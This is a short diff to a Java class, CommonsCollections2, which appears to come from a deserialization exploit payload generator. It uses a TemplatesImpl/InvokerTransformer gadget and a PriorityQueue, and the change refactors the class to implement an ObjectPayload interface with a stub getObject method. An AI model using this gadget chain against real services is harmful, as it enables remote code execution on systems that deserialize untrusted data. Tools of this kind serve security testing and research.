@@ -9,10 +9,11 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.PriorityQueue;
+import java.util.Queue;
 
-public class CommonsCollections2 {
+public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object tpl = Gadgets.createTemplatesImpl(type, param);
 
         // mock method name until armed
@@ -41,5 +42,10 @@ public class CommonsCollections2 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Queue<Object> getObject(String command) throws Exception {
+        return null;
     }
 }
